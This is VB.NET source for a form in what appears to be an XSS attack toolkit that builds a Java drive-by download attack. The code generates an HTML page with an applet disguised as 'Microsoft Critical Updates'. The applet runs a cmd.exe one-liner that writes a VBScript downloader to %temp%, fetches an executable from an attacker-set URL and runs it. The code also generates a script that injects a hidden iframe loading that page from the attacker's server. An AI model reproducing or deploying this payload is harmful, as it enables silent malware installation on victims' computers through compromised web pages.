Imports System.Threading
Imports Ionic.Zip
Public Class xss_java_driveby

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        On Error Resume Next
        If url.Text = "" Then
            MsgBox("Specify the path to the URL")
        Else
            Dim q As String = """"
            Dim stream As New IO.StreamWriter(Application.StartupPath & "\index.html")
            Dim ran = New Random()
            Dim tmp = ran.Next(2300, 2400)
            stream.WriteLine("<applet code='Client.class' archive='xdrive.jar' name='Microsoft Critical Updates' height=1 width=1><param name='windows1' value='cmd.exe /c echo Const adTypeBinary = 1 &gt; %temp%\winconfig.vbs &amp; echo Const adSaveCreateOverWrite = 2 &gt;&gt; %temp%\winconfig.vbs &amp; echo Dim abc &gt;&gt; %temp%\winconfig.vbs &amp; echo Dim xyz &gt;&gt; %temp%\winconfig.vbs &amp; echo Dim rofl &gt;&gt; %temp%\winconfig.vbs &amp; echo abc = &quot;ADODB&quot; &gt;&gt; %temp%\winconfig.vbs &amp; echo xyz = &quot;.Stream&quot; &gt;&gt; %temp%\winconfig.vbs &amp; echo Set rofl = CreateObject(abc+xyz) &gt;&gt; %temp%\winconfig.vbs &amp; echo rofl.Type = adTypeBinary &gt;&gt; %temp%\winconfig.vbs &amp; echo rofl.Open &gt;&gt; %temp%\winconfig.vbs &amp; echo rofl.Write BinaryGetURL(Wscript.Arguments(0)) &gt;&gt; %temp%\winconfig.vbs &amp; echo rofl.SaveToFile Wscript.Arguments(1), adSaveCreateOverWrite &gt;&gt; %temp%\winconfig.vbs &amp; echo Function BinaryGetURL(URL) &gt;&gt; %temp%\winconfig.vbs &amp; echo Dim lol &gt;&gt; %temp%\winconfig.vbs &amp; echo Set lol = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; %temp%\winconfig.vbs &amp; echo lol.Open &quot;GET&quot;, URL, False &gt;&gt; %temp%\winconfig.vbs &amp; echo lol.Send &gt;&gt; %temp%\winconfig.vbs &amp; echo BinaryGetURL = lol.ResponseBody &gt;&gt; %temp%\winconfig.vbs &amp; echo End Function &gt;&gt; %temp%\winconfig.vbs &amp; echo Set blub = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; %temp%\winconfig.vbs &amp; echo blub.Run &quot;%temp%\update.exe&quot; &gt;&gt; %temp%\winconfig.vbs &amp; start %temp%\winconfig.vbs " & url.Text & " %temp%\update.exe'></applet>")
            stream.Close()
            Dim streamx As New IO.StreamWriter(Application.StartupPath & "\xss.js")
            streamx.WriteLine("if (document.getElementById('xenotix_db" & Str(tmp) & "') == null){ ")
            streamx.WriteLine("var ifm=document.createElement('iframe');")
            streamx.WriteLine("ifm.setAttribute('src','http://" & xss_server.server_ip & "/index.html'); ifm.width=0; ifm.height=0;")
            streamx.WriteLine("document.body.appendChild(ifm);")
            streamx.WriteLine("script = document.createElement('script');script.id = 'xenotix_db" & Str(tmp) & "'; document.body.appendChild(script); }")

            streamx.Close()
            Button1.Enabled = False
            Using unzip As ZipFile = ZipFile.Read(Application.StartupPath & "\xdrive.zip")
                unzip.Password = "asd123"
                Dim ee As ZipEntry

                For Each ee In unzip
                    ee.Extract(Application.StartupPath, ExtractExistingFileAction.OverwriteSilently)
                Next
            End Using

        End If

    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("index.html")
        IO.File.Delete("xdrive.jar")
        Me.Close()
    End Sub

    Private Sub Form9_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        url.Text = "http://" & xss_server.server_ip & "/sample.exe"
        IO.File.Delete("xss.js")
        IO.File.Delete("index.html")
        IO.File.Delete("xdrive.jar")
    End Sub

    Private Sub TextBox2_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub url_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles url.TextChanged

    End Sub

    Private Sub TextBox4_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub GroupBox1_Enter(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub TextBox3_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub
End Class